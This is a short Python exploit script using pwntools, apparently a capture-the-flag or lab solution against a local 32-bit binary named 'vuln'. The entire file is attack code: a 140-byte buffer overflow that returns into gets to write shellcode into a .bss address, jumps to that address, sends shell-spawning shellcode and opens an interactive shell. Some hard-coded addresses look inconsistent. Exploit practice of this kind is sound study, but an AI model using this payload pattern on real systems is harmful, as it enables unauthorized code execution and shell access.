from pwn import *

def main():
  gets = 0x0008282
  main = 0x00082FF
  offset = 140

  r = process("./vuln")
  context(os='linux', arch='i386')
  bss = 0x0804a02c

  p = 'A' * offset
  p += p32(gets)
  p += p32(bss)
  p += p32(bss)

  r.sendline(p)
  r.sendline(asm(shellcraft.sh()))

  r.interactive()

if __name__ == '__main__':
  main()
